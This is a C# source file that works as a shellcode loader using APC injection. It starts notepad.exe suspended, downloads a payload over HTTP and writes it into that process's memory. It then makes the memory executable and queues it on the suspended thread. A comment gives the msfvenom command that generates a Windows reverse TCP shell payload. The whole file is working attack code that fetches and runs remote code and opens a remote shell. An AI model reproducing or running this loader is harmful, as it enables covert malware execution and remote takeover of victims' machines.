using System.Net;
using System.Runtime.InteropServices;

public class ProcInject {

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr handle, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static class CreationFlags
    {
        public const uint SUSPENDED = 0x4;
    }

    public enum ThreadAccess : int
    {
        SET_CONTEXT = 0x0010
    }

    public static readonly UInt32 MEM_COMMIT = 0x1000;
    public static readonly UInt32 MEM_RESERVE = 0x2000;
    public static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
    public static readonly UInt32 PAGE_READWRITE = 0x04;

    public static void Main(string[] args) {

        STARTUPINFO startInfo = new STARTUPINFO();
        PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

        var initSuccess = CreateProcess(null, @"C:\Windows\System32\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref startInfo, ref procInfo);

        if (initSuccess) {
            Console.WriteLine($"PID: {procInfo.dwProcessId}");
            Console.WriteLine($"TID: {procInfo.dwThreadId}");
        }

        WebClient wClient = new WebClient();

        //payload
        // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -o shellcode.bin

        byte[] shellcode = wClient.DownloadData("http://127.0.0.1/shellcode.bin");

        // Allocate memory as Read/Write
        IntPtr hMemory = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // Write shellcode
        IntPtr bytesWritten = IntPtr.Zero;
        bool success = WriteProcessMemory(procInfo.hProcess, hMemory, shellcode, shellcode.Length, ref bytesWritten);

        // Change memory to Read/Execute
        IntPtr proc_handle = procInfo.hProcess;
        success = VirtualProtectEx(proc_handle, hMemory, shellcode.Length, PAGE_EXECUTE_READ, out _);

        // Call QueueUserAPC
        IntPtr ptr = QueueUserAPC(hMemory, procInfo.hThread, IntPtr.Zero);

        // Resume thread
        IntPtr ThreadHandle = procInfo.hThread;
        ResumeThread(ThreadHandle);

    }
}